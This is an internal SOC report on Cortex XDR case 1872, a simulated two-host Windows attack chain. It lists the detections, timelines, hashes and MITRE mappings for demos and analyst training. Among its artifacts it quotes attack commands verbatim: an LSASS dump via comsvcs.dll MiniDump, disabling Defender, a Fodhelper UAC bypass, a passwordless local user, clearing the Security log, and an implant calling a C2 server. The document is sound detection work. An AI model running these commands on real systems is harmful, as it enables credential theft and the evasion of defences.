# Cortex XDR Case 1872 — Multi-Stage Windows Compromise Simulation Report

> **Report type**: Internal investigation + demo source document
> **Prepared**: 2026-05-19
> **Investigator**: Phantom Agent + manual SOC review (Ayman)
> **Audience**: SOC managers, CISOs, and downstream presentation-generation models
> **Purpose**: A complete, self-contained record of one end-to-end attack-simulation cycle — what was simulated, what Cortex XDR detected, what the human and AI analysts observed, and which findings deserve demo airtime.

---

## 0. Document Metadata

| Field | Value |
|---|---|
| XDR case ID | **1872** |
| Case name | `'File Drop - 2554896526' along with 74 other issues` |
| Case severity | High |
| Case status (at report time) | new |
| Case time window | **2026-05-19 07:50:59 → 08:18:58 UTC** (28 m 0 s) |
| Case last modified | 2026-05-19 08:19:11 UTC |
| Total alerts | 75 |
| Unique detection types | 18 |
| MITRE techniques observed | 13 |
| MITRE tactics observed | 7 |
| Detection sources | XDR Agent (72), XDR Analytics BIOC (1), XDR BIOC (2), WildFire (within XDR Agent count) |
| Hosts involved | `xdragent` (10.10.0.14), `xdragent2` (10.10.0.16) |
| Users involved | `ayman`, `XDRAGENT\ayman`, `xdragent2\ayman` |
| Tenant | `api-emea-cxdrp.xdr.eu.paloaltonetworks.com` |

---

## 1. Executive Summary

Between **07:50:59 and 08:18:58 UTC on 2026-05-19**, Cortex XDR observed and clustered a multi-stage Windows compromise across two endpoints (`xdragent` and `xdragent2`) into a single case (1872). The case contains **75 raw alerts** that XDR's correlation engine collapses into **18 unique behavioral detection patterns** spanning **7 MITRE tactics** and **13 MITRE techniques**. The chain begins with a malicious executable drop in `C:\Users\Public\` and culminates in a WildFire cloud-sandbox malware verdict on the same file 27 minutes later. The inflection point — where the adversary pivots from reconnaissance to credential theft — is a `rundll32 + comsvcs.dll` LSASS dump at **08:11:04**, which triggers 42 Mimikatz signature alerts in the same second.

This activity was generated as a **controlled red-team simulation** using the Phantom platform's bundled `Phantom phishing -> ransomware kill chain (cross-host, expanded)` Caldera adversary — a 20-step ATT&CK emulation that fires identical abilities in parallel on two Windows endpoints. The simulation's purpose is to produce a known-good attack baseline against which XDR's detection rules can be validated, demoed to customers, and used to train SOC analysts. The simulation runs lab-safe: no real exfiltration, no actual ransomware, no domain controllers touched.

This report covers the simulation setup, the full XDR detection inventory, the critical forensic artifacts, observed anomalies (most notably **polymorphic payload hashing per host** and **sub-second cross-host execution lag**), the MITRE-labeling nuance that makes Step 1 commonly misread, detection coverage analysis, a chronological speaker-ready narration, and demo-flow recommendations. It also embeds five investigation prompts for the Cortex AgentiX investigation agent that exercise multi-step reasoning across the case.

---

## 2. Background: The Exercise Stack

| Component | Role | Where it ran |
|---|---|---|
| **Phantom** (v0.6.34 platform) | The chat-driven orchestrator. Owns the connector catalog (Caldera, Cortex XDR, Cortex Docs), the kill-chain skill, and the agent loop that drives the simulation end-to-end. | `phantom-vm` (cortex-gcp-labs, internal IP 10.10.0.81) |
| **Caldera** (5.3.0) | The C2 framework that fires the simulated attacker abilities on the Windows endpoints. Hosts the adversary definitions, the agent payloads (`resultsreport.exe`), and the operation lifecycle. | `phantom-vm`, port 8888 |
| **Cortex XDR Agent** | Endpoint detection sensor running on both Windows VMs. Sends telemetry to Cortex XDR cloud (api-emea-cxdrp). | `xdragent` + `xdragent2` |
| **Cortex XDR cloud** | Correlation engine, BIOC/Analytics BIOC behavioral rules, signature engine, WildFire cloud sandbox, case clustering, MITRE mapping. | `api-emea-cxdrp.xdr.eu.paloaltonetworks.com` |
| **Cortex Docs Search** (cortex-docs connector) | Live lookup of Cortex documentation. Used in this exercise to map ATT&CK techniques to XDR's documented detection coverage before firing the chain. | Cortex public docs portal |

Why this combination matters for the demo: it lets a SOC analyst orchestrate a real-attack simulation, watch XDR catch each beat, and reason about the chain — all from a single chat interface — without leaving the investigation tool to context-switch into Caldera's UI or jump between disparate consoles. Phantom is the orchestrator; XDR is the witness.

---

## 3. The Environment

### 3.1 Endpoints

| Host | IP | OS | Caldera agent paw | XDR Agent installed |
|---|---|---|---|---|
| `xdragent` | 10.10.0.14 | Windows (workgroup) | varies per run — most recent: `ryzdmp` | Yes |
| `xdragent2` | 10.10.0.16 | Windows (workgroup) | varies per run — most recent: `irvhiz` | Yes |

Both endpoints share the same local-administrator credential set (`ayman`) and are connected at a workgroup level — no domain controller, no AD authentication. This is intentional for the lab: lateral movement abilities use SMB+WMI+WinRM against the workgroup credential, which is the same pattern enterprise attackers use after credential theft from a domain-joined member.

### 3.2 Network topology

```
Internet (Cortex XDR cloud) ◀── HTTPS:443 ── XDR Agents
                                              │
                                              ▼
                                       xdragent (10.10.0.14)
                                       xdragent2 (10.10.0.16)
                                              ▲
                                              │ (SMB+WMI+WinRM:445/135/5985)
                                              ▼
                                       Caldera C2 (10.10.0.81:8888)
                                              ▲
                                              │
                                       phantom-agent (orchestrator)
```

### 3.3 The user identity in play

All activity in case 1872 traces to user `ayman` (the local administrator on both endpoints). XDR sees the user under three normalizations:
- `ayman` (process owner field)
- `XDRAGENT\ayman` (NT-style, full qualification, BIOC alerts)
- `xdragent2\ayman` (cross-host attribution from the lateral movement step)

---

## 4. The Caldera Simulation

### 4.1 Adversary definition

| Field | Value |
|---|---|
| Adversary name | `Phantom phishing -> ransomware kill chain (cross-host, expanded)` |
| Most recent operation ID observed | `89644a10-033f-4c6d-a19d-854503d46df1` |
| Operation name | `phishing-killchain-run-1` |
| Total abilities in chain | 20 atomic ATT&CK techniques |
| Host group size | 2 agents (red group: xdragent + xdragent2) |
| Expected total chain links | 40 (20 abilities × 2 hosts) |
| Operation state at last sample | `running`, 30/40 links terminal (75% complete) |

### 4.2 The 20 abilities in order (per host)

Each ability fires sequentially per host; both hosts run the chain in parallel. The skill's polling tool (`caldera_wait_for_operation_progress`, v0.6.34+) waits for terminal states (succeeded / failed / collected / stopped / parser-fail) between steps and narrates progress every 2-3 abilities. Reading order: top-to-bottom matches Caldera's `atomic_ordering` UUID list.

| # | MITRE | Ability name (Caldera) | Telemetry artifact |
|---|---|---|---|
| 1 | T1566.001 | Phishing simulation v3.3 | `emailclient.exe` masquerade (`OriginalFileName=NOTEPAD.EXE`) writing `resultsreport.exe` to `C:\Users\Public\` |
| 2 | T1059.003 | Command prompt writes script then executes | `cmd.exe` writes `.bat`/`.cmd`/`.ps1` to `%TEMP%`, runs it |
| 3 | T1087.001 | Account + System Discovery (workgroup-friendly) | `whoami`, `Get-LocalUser`, `query session` |
| 4 | T1082 | System + Network Information Burst | `systeminfo`, `arp`, `netstat`, `route` within 5s window |
| 5 | T1135 | Network Share Discovery | `net share`, `net view`, `Get-SmbShare` |
| 6 | T1003.005 | Cached Credential Dump via Cmdkey | `cmdkey.exe /list` |
| 7 | **T1003.001** | **LSASS Memory Dump via comsvcs.dll** ★ | `rundll32 comsvcs.dll MiniDump <pid> C:\Windows\Temp\lsass-*.dmp full` |
| 8 | T1548.002 | Bypass UAC using Fodhelper - PowerShell | Registry write to `HKCU\software\classes\ms-settings\shell\open\command\` |
| 9 | T1562.001 | Disable Defender Real-time Monitoring | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| 10 | T1140 | Certutil Decode Payload | `certutil.exe -decode` writes file output to `%TEMP%` |
| 11 | T1136.001 | Create a new user in PowerShell | `New-LocalUser -Name "T1136.001_PowerShell" -NoPassword` |
| 12 | T1547.001 | Registry Run Key Persistence | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PhantomUpdater` set |
| 13 | T1053.005 | Scheduled Task onlogon | `schtasks /create /sc onlogon /ru SYSTEM /rl HIGHEST` |
| 14 | **T1021.002** | **Lateral movement to xdragent2 — real SMB+WMI+WinRM+RCE** ★ | Outbound TCP 445+5985 from xdragent → 10.10.0.16, NTLM auth as `phantomlab`, remote process creation |
| 15 | T1119 | Automated Collection (safe — no protected dirs) | High-volume file enumeration in user-home dirs |
| 16 | T1560 | Compress Data for Exfiltration (PowerShell) | `Compress-Archive` produces `.zip` in `%TEMP%` |
| 17 | T1071.004 | Application Layer Protocol: DNS C2 | 10 distinct DNS queries to `*.phantomlab.example.invalid` |
| 18 | T1041 | Exfiltration over C2 Channel | Outbound HTTP POST base64 body to `10.10.0.81:8888` |
| 19 | T1491 | (Defacement-style impact) | `.txt` ransom-note write in user-visible directory |
| 20 | **T1070.001** | **Indicator Removal: Clear Windows Event Logs** ★ | `wevtutil cl Security` → Event ID 1102 fires unconditionally |

★ = the three marquee detection signals (LSASS, lateral movement, event-log clear). Designed to test EDR coverage at the most consequential points in the kill chain.

### 4.3 Per-operation failure modes (parser noise, not real failures)

Across the most recent run (op `89644a10`), Caldera flagged **5 ability invocations as FAIL**. All five are pre-existing parser quirks, not regressions — they fail in identical patterns on every run of this adversary:

| Caldera ability | Why it "fails" | Did XDR still catch the artifact? |
|---|---|---|
| T1548.002 Fodhelper UAC bypass (×2 hosts) | Registry key writes succeed, but the parser checks for a post-bypass privesc artifact that Defender or UAC prevents. | **Yes** — XDR Agent fires "UAC Bypass Prevention - 3517653111" (T1548.002) on both hosts at 08:11:37 and 08:12:15. |
| T1136.001 `New-LocalUser` (×2 hosts) | User often pre-exists from a previous run; or group policy prevents `-NoPassword`. | **Yes** — XDR BIOC fires "New local user created via PowerShell command line" (T1098) on both hosts at 08:14:08 and 08:14:25. |
| T1560 Compress-Archive (1 host) | `dir $env:USERPROFILE -Recurse` trips on junction points → non-zero exit, but the .zip still creates. | (No specific XDR alert on archive creation in this case — Sysmon EID 11 would be the proof in a SIEM-side check.) |

**Lesson worth surfacing in the demo**: Caldera's parser verdict ≠ XDR's detection coverage. XDR detects on Windows-side telemetry (Sysmon EID 1/11/13, Security 4688/4720/4698, Defender Operational), not on whether Caldera's success-checker thinks the side effect verified. **A "failed" Caldera step can still be a "detected" XDR threat.**

---

## 5. The XDR Case — Detection Inventory

### 5.1 Case-level summary

```
incident_id            : 1872
incident_name          : 'File Drop - 2554896526' along with 74 other issues
severity               : high
status                 : new
creation_time          : 2026-05-19 07:50:59 UTC (1779177072000 ms)
modification_time      : 2026-05-19 08:19:11 UTC (1779178751000 ms)
alert_count            : 75
hosts                  : ['xdragent', 'xdragent2']
users                  : ['ayman', 'XDRAGENT\\ayman', 'xdragent2\\ayman']
```

### 5.2 MITRE technique frequency (across 75 alerts)

| Count | Technique |
|---|---|
| 42 | T1555 — Credentials from Password Stores |
| 4 | T1574.002 — Hijack Execution Flow: DLL Side-Loading |
| 4 | T1059.001 — Command and Scripting Interpreter: PowerShell |
| 4 | T1059 — Command and Scripting Interpreter |
| 4 | T1003.001 — OS Credential Dumping: LSASS Memory |
| 2 | T1112 — Modify Registry |
| 2 | T1098 — Account Manipulation |
| 2 | T1140 — Deobfuscate/Decode Files or Information |
| 2 | T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control |
| 2 | T1086 — PowerShell |
| 2 | T1197 — BITS Jobs |
| 1 | T1003 — OS Credential Dumping |
| 4 | (no MITRE label — Suspicious Process Creation + WildFire verdict) |

The 42-count for T1555 is the Mimikatz signature firing dozens of times per LSASS dump invocation (it pattern-matches multiple memory regions during a single mimikatz pass).

### 5.3 The 18 unique detections (chronological)

Each block below is a unique XDR detection pattern, deduplicated across both hosts. Use this as the source of truth for slide structure; one detection = one demo beat if needed.

#### Detection 1 — `File Drop - 2554896526` (×4 alerts)
- **First fire**: 07:50:59 UTC on `xdragent` (alert 40950 + 40951)
- **Second fire**: 07:51:20 UTC on `xdragent2` (alert 40952 + 40953) — 21-second cross-host lag
- **MITRE**: T1574.002 / TA0003 Persistence
- **Source**: XDR Agent (signature engine)
- **Severity**: high
- **Category**: Malware
- **Causality actor**: `powershell.exe` (SHA256 `38f4384643b3fa0de714d2367b712c2e0fa1c89e2cfd131ae6b831ad962b1033`, MD5 `dd6f4b7818a253887b8ea86515f6fb7d`)
- **Actor process**: `powershell.exe` (same hash)
- **Target file**: `C:\Users\Public\resultsreport.exe` (path NOT exposed in the alert envelope — the File Drop alert fires on the writer process at write-time; the target file path is discoverable only via causality view, XQL hunt, or correlation with the later WildFire alert which DOES expose it)
- **Description**: "Malicious file creation in public folder"
- **Why this fires**: signature `2554896526` matches the hash family curated as a known DLL-side-loading toolkit. **The MITRE T1574.002 label describes the technique the toolkit enables, NOT the file's extension.** The dropped file is `resultsreport.exe`, an executable, not a `.dll`.

#### Detection 2 — `Staged Malware Activity - 2657373215` (×2 alerts)
- **First fire**: 08:06:47 UTC on `xdragent` (alert 40955)
- **Second fire**: 08:06:53 UTC on `xdragent2` (alert 40957) — 6-second lag
- **MITRE**: T1197 / TA0003 Persistence (BITS Jobs)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Category**: Malware
- **Causality actor**: `powershell.exe` (same SHA256 as Detection 1)
- **Description**: "Attempt to download malware via BITS job interface"
- **Why this fires**: PowerShell invoking BITS to download content is rare in legitimate workflows and high-fidelity for malware staging.

#### Detection 3 — `Script Activity - 1199133676` (×2 alerts)
- **First fire**: 08:06:51 UTC on `xdragent` (alert 40956)
- **Second fire**: 08:06:57 UTC on `xdragent2` (alert 40961) — 6-second lag
- **MITRE**: T1086 / TA0009 Collection (PowerShell)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Script drops and executes script or executable"
- **Why this fires**: classic "PowerShell drops AND runs" — high anomaly score in non-development environments.

#### Detection 4 — `Powershell Activity - 997113718` (×2 alerts)
- **First fire**: 08:08:13 UTC on `xdragent` (alert 40966)
- **Second fire**: 08:08:19 UTC on `xdragent2` (alert 40968) — 6-second lag
- **MITRE**: T1059.001 / TA0002 Execution (PowerShell)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Netstat or a recon utility was executed by a base64 encoded powershell command line"
- **Why this fires**: `-EncodedCommand` or equivalent base64 PS invoking native recon utilities (netstat, arp) is a high-fidelity adversary pattern.

#### Detection 5 — `Script Engine Activity - 2909583408` (×2 alerts)
- **First fire**: 08:11:03 UTC on `xdragent` (alert 40969)
- **Second fire**: 08:11:25 UTC on `xdragent2` (alert ~40996) — 22-second lag
- **MITRE**: T1059 / TA0002 Execution
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Suspicious script engine activity"
- **Why this fires**: pre-LSASS-dump PowerShell preparation — the script engine spinning up in a pattern consistent with credential-dumping prep.

#### Detection 6 — `Lsass Dump Attempt - 773095356` ★ inflection point (×2 alerts)
- **First fire**: **08:11:04 UTC** on `xdragent` (alert 40970)
- **Second fire**: 08:11:25 UTC on `xdragent2` (alert 40998 or similar) — 21-second lag
- **MITRE**: T1003.001 / TA0005 Defense Evasion (LSASS Memory dump)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Category**: Malware
- **Causality actor**: `powershell.exe`
- **Description**: "Rundll32 \comsvcs.dll used to dump lsass.exe to get passwords"
- **Why this fires**: LOLBin pattern — `rundll32.exe` invoking `comsvcs.dll` with the `MiniDump` export against a process handle pointing at `lsass.exe` is a textbook credential-dumping signature.
- **This is the chain's inflection point**: from this beat forward, the attacker has high-value credentials. The post-LSASS detections (UAC bypass, persistence triplet, WildFire verdict) all build on this moment.

#### Detection 7 — `LSASS dump file written to disk` (×1 alert)
- **Fire**: 08:11:04 UTC on `xdragent` (alert 40971) — fires only on xdragent in this case
- **MITRE**: T1003 / TA0006 Credential Access
- **Source**: **XDR Analytics BIOC** (behavioral — file-write side)
- **Severity**: medium
- **Category**: Credential Access
- **Action file**: `C:\Windows\Temp\lsass-141987479.dmp`
- **Actor process**: `rundll32.exe`
- **Actor command line**: `rundll32.exe  C:\Windows\System32\comsvcs.dll, MiniDump 856 C:\Windows\Temp\lsass-141987479.dmp full`
- **Description**: "Dumping Lsass.exe (Local Security Authority Subsystem Service) memory to file allows attackers to later extract credentials from the memory dump"
- **Why this fires**: the behavioral side of the LSASS dump — independent confirmation of the Detection 6 signature hit. XDR has TWO engines watching the same event: signature (Detection 6) AND behavioral file-write watcher (Detection 7). Both fire within the same second, giving an extremely high-confidence verdict.

#### Detection 8 — `Credential Gathering Protection - 1428024063` (×2 alerts)
- **Fires**: 08:11:06 UTC on both hosts
- **MITRE**: T1003.001 / TA0005 Defense Evasion
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "MiniDumpWriteDump() on lsass.exe"
- **Why this fires**: native-API-call pattern matching — the `MiniDumpWriteDump` Windows API being invoked against an `lsass.exe` handle. Fires regardless of how the API was reached (rundll32, comsvcs, native code, etc.).

#### Detection 9 — `Credential Gathering Protection - 3598738926` ★ Mimikatz signature (×40 alerts!)
- **First fire**: 08:11:06 UTC on `xdragent`
- **Subsequent fires**: 08:11:06 → 08:11:27 UTC across both hosts (the 21-second spread covers both hosts' LSASS reads)
- **MITRE**: T1555 / TA0006 Credential Access (Credentials from Password Stores)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Category**: Malware
- **Description**: "Mimikatz"
- **Why this fires 40 times**: the signature pattern-matches multiple memory regions during a single mimikatz pass. Each region read trips the signature independently. **This is why a single LSASS dump produces a deluge of alerts** — and the demo can use this as the "alert fatigue" angle (75 alerts collapsed into 18 unique behaviors).

#### Detection 10 — `Credential Gathering Protection - 2616217867` (×2 alerts)
- **Fires**: 08:11:06 UTC, both hosts
- **MITRE**: T1555 / TA0006 Credential Access
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Credentials extraction from Lsass attempt"
- **Why this fires**: complementary to Detection 9 — different signature variant for the same credential-extraction event.

#### Detection 11 — `UAC Bypass Prevention - 3517653111` (×2 alerts)
- **First fire**: 08:11:37 UTC on `xdragent`
- **Second fire**: 08:12:15 UTC on `xdragent2` — 38-second lag (widest in the chain post-LSASS)
- **MITRE**: T1548.002 / TA0005 Defense Evasion (Bypass UAC)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Potential UAC bypassing Proxy Execution by modifying ms-settings registry configuration"
- **Why this fires**: the Fodhelper UAC bypass writes to `HKCU\software\classes\ms-settings\shell\open\command\` to hijack the auto-elevated `fodhelper.exe` execution context. XDR's signature catches the registry write pattern.

#### Detection 12 — `Suspicious Process Creation` (×2 alerts)
- **Fires**: 08:11:37 / 08:12:15 UTC paired with Detection 11
- **MITRE**: (no label)
- **Source**: XDR Agent
- **Severity**: medium
- **Action command**: `"C:\Windows\System32\cmd.exe"`
- **Description**: "Suspicious process creation detected"

#### Detection 13 — `File Drop - 2775215878` (×2 alerts) [certutil decode]
- **First fire**: 08:13:23 UTC on `xdragent`
- **Second fire**: 08:13:36 UTC on `xdragent2` — 13-second lag
- **MITRE**: T1140 / TA0005 Defense Evasion
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Malicious use of \"certutil\""
- **Why this fires**: `certutil -decode` is a classic LOLBin pattern — using the legitimate Windows certificate utility to deobfuscate hidden payloads.

#### Detection 14 — `New local user created via PowerShell command line` (×2 alerts) — BIOC rule
- **First fire**: 08:14:08 UTC on `xdragent`
- **Second fire**: 08:14:25 UTC on `xdragent2` — 17-second lag
- **MITRE**: T1098 / TA0003 Persistence
- **Source**: **XDR BIOC** (behavioral — the BIOC rule explicitly matches the PowerShell command-line pattern)
- **Severity**: medium
- **Category**: Persistence
- **Command captured**: `powershell.exe -ExecutionPolicy Bypass -C "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword"`
- **Description**: "Process action type = execution AND target process name = powershell.exe, powershell_ise.exe AND target process cmd = *New-LocalUser*"
- **Why this fires**: XDR BIOC author-built rule. The rule logic is visible right in the description — a process-event filter looking for PowerShell with `New-LocalUser` in the command line.
- **Demo significance**: this is the only place in the chain where we can see XDR's BIOC rule logic transparently. Worth showing in the demo as "this is what a behavioral rule LOOKS like — pattern over event stream, not a fixed signature."

#### Detection 15 — `Powershell Activity - 3962032482` (×2 alerts)
- **Fires**: 08:14:49 / 08:15:10 UTC, both hosts
- **MITRE**: T1059 / TA0002 Execution
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Suspicious Powershell activity"

#### Detection 16 — `Powershell Activity - 483766054` (×2 alerts) [autorun registry]
- **Fires**: 08:14:49 / 08:15:10 UTC, both hosts
- **MITRE**: T1112 / TA0005 Defense Evasion (Modify Registry)
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "A malicious powershell command line was set to autorun"
- **Why this fires**: PowerShell writing to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\` — the canonical user-level autorun persistence location.

#### Detection 17 — `Powershell Activity - 99809301` (×2 alerts) [scheduled task]
- **First fire**: 08:15:39 UTC on `xdragent`
- **Second fire**: 08:15:53 UTC on `xdragent2` — 14-second lag
- **MITRE**: T1059.001 / TA0002 Execution
- **Source**: XDR Agent (signature)
- **Severity**: high
- **Description**: "Suspicious powershell, that creates malicious Scheduled Task"

#### Detection 18 — `WildFire Malware` ★ closing verdict (×2 alerts)
- **First fire**: **08:17:56 UTC** on `xdragent` (alert 41036)
- **Second fire**: **08:18:58 UTC** on `xdragent2` (alert 41037) — 62-second lag
- **MITRE**: (none — WildFire is a behavioral verdict, not a technique mapping)
- **Source**: XDR Agent + WildFire cloud sandbox
- **Severity**: high
- **Category**: Malware
- **Action file path**: `C:\Users\Public\resultsreport.exe`
- **Action file name**: `resultsreport.exe`
- **Action file SHA256 (xdragent)**: `70dc0340bc755ed309cef4865a88827c8aa597212a49e40670c430cd82b4e171`
- **Action file SHA256 (xdragent2)**: `bbc1ff03daed06667889e900e01947e4863aeadef110b7cf797e9c74ef1aba64` ← **different hash, same path** — polymorphic payload
- **Actor command line**: `"C:\Users\Public\resultsreport.exe" -server http://10.10.0.81:8888 -group red`
- **Causality actor**: `powershell.exe` (same SHA256 as Detection 1 — proving Detection 1 and Detection 18 are about the same file event)
- **Description**: "Suspicious executable detected"
- **Why this fires**: WildFire's cloud sandbox completed its dynamic-analysis pass on the dropped executable and returned a malicious verdict. The ~27-minute gap between the original Detection 1 (file drop) and this verdict reflects WildFire's typical post-detonation analysis time.

---

## 6. Critical Forensic Artifacts

### 6.1 The dropped implant — `resultsreport.exe`

| Property | Value |
|---|---|
| File path | `C:\Users\Public\resultsreport.exe` (both hosts) |
| File creation time | xdragent: 2026-05-19 07:50:59 UTC<br>xdragent2: 2026-05-19 07:51:20 UTC |
| Writer process | `powershell.exe` (legitimate system PS, SHA256 `38f4384643b3fa0de714d2367b712c2e0fa1c89e2cfd131ae6b831ad962b1033`) |
| Runtime command line | `"C:\Users\Public\resultsreport.exe" -server http://10.10.0.81:8888 -group red` |
| **SHA256 on xdragent** | `70dc0340bc755ed309cef4865a88827c8aa597212a49e40670c430cd82b4e171` |
| **MD5 on xdragent** | `7acec55a87b81833bdde1ef0d5a5e326` |
| **SHA256 on xdragent2** | `bbc1ff03daed06667889e900e01947e4863aeadef110b7cf797e9c74ef1aba64` |
| **MD5 on xdragent2** | `415daf27e1b90e14e968b6799b640d43` |

**The hash divergence is the key finding.** Same filename, same path, same role, same parent process, same Caldera command-line arguments — but two completely different binaries on the two hosts. This models polymorphic payload delivery: each compromised endpoint receives a unique build, defeating hash-based blocklists. XDR clusters them into the same case because behavior matches, not hash.

### 6.2 The LSASS memory dump

| Property | Value |
|---|---|
| File path | `C:\Windows\Temp\lsass-141987479.dmp` |
| File creation time | 2026-05-19 08:11:04 UTC (xdragent — captured in BIOC alert 40971) |
| Writer process | `rundll32.exe` |
| Full command line | `rundll32.exe  C:\Windows\System32\comsvcs.dll, MiniDump 856 C:\Windows\Temp\lsass-141987479.dmp full` |
| Target PID | `856` (the LSASS process at the time of dump) |
| Dump type | `full` (entire process memory image) |

The full-form `MiniDump` flag means the attacker captured ALL of LSASS's memory state — including credential material that mimikatz can extract offline. In a real attack, that file would be exfiltrated for offline analysis.

### 6.3 The new local user

| Property | Value |
|---|---|
| Account name | `T1136.001_PowerShell` |
| Created via | `powershell.exe -ExecutionPolicy Bypass -C "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword"` |
| Created on | both hosts (xdragent at 08:14:08, xdragent2 at 08:14:25) |
| Password | none (`-NoPassword` flag) |
| Persistence purpose | A user account without password is an unusual artifact — it's a marker for "I was here" persistence, and modeling the technique where attackers create dormant accounts for later re-entry. |

### 6.4 The PowerShell parent

| Property | Value |
|---|---|
| Image path | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| SHA256 | `38f4384643b3fa0de714d2367b712c2e0fa1c89e2cfd131ae6b831ad962b1033` |
| MD5 | `dd6f4b7818a253887b8ea86515f6fb7d` |
| Role in chain | Causality root for **every single alert** in case 1872 — 18 unique detections all trace back to this SAME powershell.exe SHA256 |

**This is the demo's most powerful pivot moment.** The fact that one process (the legitimate, signed system PowerShell binary) is the ancestor of EVERY detection in a 75-alert case is the canonical "trusted process abuse" story.

---

## 7. Detection Layer Analysis

XDR catches case 1872 through **four independent detection layers**, each providing a different angle on the attack. The layered convergence is the demo's strongest technical credibility moment.

| Layer | Mechanism | Detections in case 1872 | Latency from event |
|---|---|---|---|
| **XDR Agent (signature)** | Static hash matching against curated threat-intel families | 72 of 75 alerts (16 of 18 unique patterns) | Real-time (< 1 second) |
| **XDR Analytics BIOC** | Behavioral correlation — ML-built rules over the kernel-event firehose | 1 alert: LSASS dump file written (Detection 7) | Real-time (< 1 second) |
| **XDR BIOC** | Analyst-authored declarative rules | 2 alerts: New local user via PowerShell (Detection 14, ×2 hosts) | Real-time (< 1 second) |
| **WildFire cloud sandbox** | Dynamic analysis of suspicious files in isolated VM | 2 alerts: WildFire Malware verdict (Detection 18, ×2 hosts) | ~27 minutes (post-detonation) |

### 7.1 What this layering catches that any single layer would miss

- **If only signature**: misses behavioral patterns that don't match a known hash (e.g., the LSASS dump file BIOC — a brand-new attacker could compile fresh, unique tooling, but the rundll32+comsvcs+lsass pattern would still trip the BIOC).
- **If only BIOC**: misses the volume of mimikatz-family signature variants (40 alerts in Detection 9 alone) that signal a credential-dumping campaign at scale.
- **If only WildFire**: 27-minute latency on every verdict means the attacker has done all their damage before WildFire can flag the binary.
- **All four together**: an attacker would have to evade the signature engine (compile fresh), the behavioral engine (use legitimate-looking process trees), the analyst rules (avoid known command patterns), AND the cloud sandbox (make the binary benign-looking when detonated in a sandbox VM). Possible — but expensive.

### 7.2 Detection layer convergence at the inflection point

At **08:11:04 UTC** on `xdragent`, three independent XDR detection layers fire on the same LSASS memory dump within the same second:
1. XDR Agent signature: `Lsass Dump Attempt - 773095356` (T1003.001) — rundll32+comsvcs LOLBin pattern
2. XDR Analytics BIOC: `LSASS dump file written to disk` (T1003) — file-write side of the same event
3. XDR Agent signatures ×40: `Credential Gathering Protection - 3598738926` (T1555) — mimikatz signature matching during memory read

That triple-convergence in a single second is the most defensible detection moment in the entire chain. **No single-engine detector could produce this density.**

---

## 8. Key Observations

### 8.1 Cross-host sub-second-to-tens-of-seconds parallel execution

Every equivalent detection between `xdragent` and `xdragent2` shows a measurable lag, but the lag is small enough that the chain is clearly running concurrently rather than sequentially:

| Detection | Host A time | Host B time | Lag |
|---|---|---|---|
| File Drop (Detection 1) | xdragent 07:50:59 | xdragent2 07:51:20 | 21s |
| BITS Stage (Detection 2) | xdragent 08:06:47 | xdragent2 08:06:53 | 6s |
| Script Activity (Detection 3) | xdragent 08:06:51 | xdragent2 08:06:57 | 6s |
| PowerShell recon (Detection 4) | xdragent 08:08:13 | xdragent2 08:08:19 | 6s |
| LSASS dump (Detection 6) | xdragent 08:11:04 | xdragent2 08:11:25 | 21s |
| UAC bypass (Detection 11) | xdragent 08:11:37 | xdragent2 08:12:15 | 38s |
| certutil decode (Detection 13) | xdragent 08:13:23 | xdragent2 08:13:36 | 13s |
| New local user (Detection 14) | xdragent 08:14:08 | xdragent2 08:14:25 | 17s |
| Scheduled task (Detection 17) | xdragent 08:15:39 | xdragent2 08:15:53 | 14s |
| WildFire verdict (Detection 18) | xdragent 08:17:56 | xdragent2 08:18:58 | 62s |

**The pattern**: most lags are 6-38 seconds, consistent with parallel agent execution. The 62-second WildFire lag is the longest — that's not attacker behavior, it's cloud-sandbox queuing variance between the two file submissions.

The interpretation a SOC analyst should draw: **the attacker had cross-host capability BEFORE XDR's first detection at 07:50:59.** This is the "investigation starts in the past" reframing — the investigation isn't about how the attacker got in (we don't know), it's about reconstructing what they've already done across the environment.

### 8.2 The 16-minute silence between Detection 1 and Detection 2

After dropping `resultsreport.exe` at 07:50:59, the attacker waited until 08:06:47 to begin further activity — a 15m 48s gap. This is by far the longest silent interval in the chain, contrasting sharply with the 33-second flurry around the LSASS dump (Detections 5 → 11 all fire between 08:11:03 and 08:12:15).

**Why a real attacker would do this**: to let sandbox detonation windows expire, to wait for a legitimate process to call the staged DLL, or to time the attack with normal user activity. **Why a Caldera simulation does this**: that's how the adversary YAML staged the operations between the phishing-implant deployment ability and the next discovery ability.

**Why this matters for the demo**: pace variation IS adversary intent. A continuous fast attack is a script kiddie; a paced attack with reconnaissance pauses is a methodical operator. Pointing out the silence reframes the case from "fast detection success" to "patient adversary observed".

### 8.3 Polymorphic payload delivery — different hash per host

Already covered in §6.1 but worth restating: same logical file (resultsreport.exe), different bytes per host. This is structurally identical to real-world polymorphic payload behavior. The fact that XDR clusters them into ONE case despite different hashes proves XDR's case-clustering is fingerprint-based (causality + behavior), not hash-based.

### 8.4 Single causality root across 75 alerts

Every alert in case 1872 traces back to the same `powershell.exe` (SHA256 `38f4384643b3fa0de714d2367b712c2e0fa1c89e2cfd131ae6b831ad962b1033`). For a SOC analyst, this means: **one process tree compromise produced all 75 alerts.** Killing that PowerShell instance and rotating any credential it touched would address the entire case.

### 8.5 Mimikatz signature firing 40 times for a single LSASS read

Detection 9 (T1555 Mimikatz signature) fires 40 times within 21 seconds — but represents only ONE underlying behavioral event: a single mimikatz pass reading multiple memory regions during a single LSASS dump invocation. Each region read trips the signature independently.

